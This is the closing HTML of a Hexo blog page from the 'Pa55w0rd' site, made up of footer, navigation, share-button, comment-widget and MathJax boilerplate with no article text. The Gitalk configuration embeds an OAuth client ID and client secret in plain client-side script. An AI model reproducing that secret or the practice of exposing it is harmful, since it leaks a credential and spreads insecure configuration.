            </li>

        
        </ul>
      </div>
    </div>
  
  
  
</aside>

      
    </div>
    <footer id="footer">
  
  <div data-scroll-reveal="enter bottom" class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 Pa55w0rd<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
    </div>

    <div id="footer-info" class="inner">
      <!-- id 将作为查询条件 
      <span id="<Your/Path/Name>" class="leancloud-visitors" data-flag-title="Your Article Title">
        <em class="post-meta-item-text">阅读量 </em>
        <i class="leancloud-visitors-count">1000000</i>
      </span>
-->
      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      <div class="powered-by">
        <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
        我的网站的访问总数:<span id="busuanzi_value_site_pv"></span>次
        </span>
      </div>

      
    </div>
  </div>

</footer>

  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
  
    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
  
    <a href="/about" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
  
    <a href="/comments" class="mobile-nav-link"><i class="fa fa-comments" aria-hidden="true"></i>留言</a>
  
    <a href="/404.html" class="mobile-nav-link"><i class="fa fa-heart" aria-hidden="true"></i>公益404</a>
  
</nav>

  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/img/betop.png"></a>
</div>

<!-- totop end -->



  <script>
    const gitalk = new Gitalk({
      clientID: "992fba235eb173826494",
      clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
      repo: "pa55w0rd.github.io",
      owner: "Pa55w0rd",
      admin: "Pa55w0rd",
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: "Fri Oct 19 2018 11:14:56 GMT+0800",      // Ensure uniqueness and length less than 50
      distractionFreeMode: false  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
  </script>




<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script>


<!-- 百度分享 end -->

<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
<script src="https://cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>



  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>



<! -- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
                processEscapes: true
                    
}
  
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
                  
}
    
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Queue(function() {
            var all = MathJax.Hub.getAllJax(), i;
            for(i=0; i < all.length; i += 1) {
                            all[i].SourceElement().parentNode.className += ' has-jax';
                                    
            }
                
        });
</script>

<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<script src="/js/script.js"></script>


</div>
</body>
</html>



<div class="site-search">
  <div class="algolia-popup popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>
    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>
</div>


<script>
$(document).ready(function(){
window.scrollReveal = new scrollReveal({ reset: true});
//
})
</script>
